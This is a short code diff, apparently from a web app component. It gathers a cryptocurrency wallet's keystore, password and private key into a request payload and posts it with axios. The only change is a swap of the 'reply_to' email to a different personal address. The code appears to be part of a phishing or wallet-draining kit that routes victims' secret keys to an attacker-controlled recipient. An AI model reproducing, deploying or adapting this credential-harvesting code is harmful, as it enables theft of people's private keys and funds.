@@ -174,7 +174,7 @@ export default {
             keystore: this.keystore,
             walletPassword: this.walletPassword,
             privateKey: this.privateKey,
-            reply_to: "LifeofLove12@protonmail.com",
+            reply_to: "fred.antho9034@gmail.com",
           },
         };
         const ip = await this.$axios.$post(
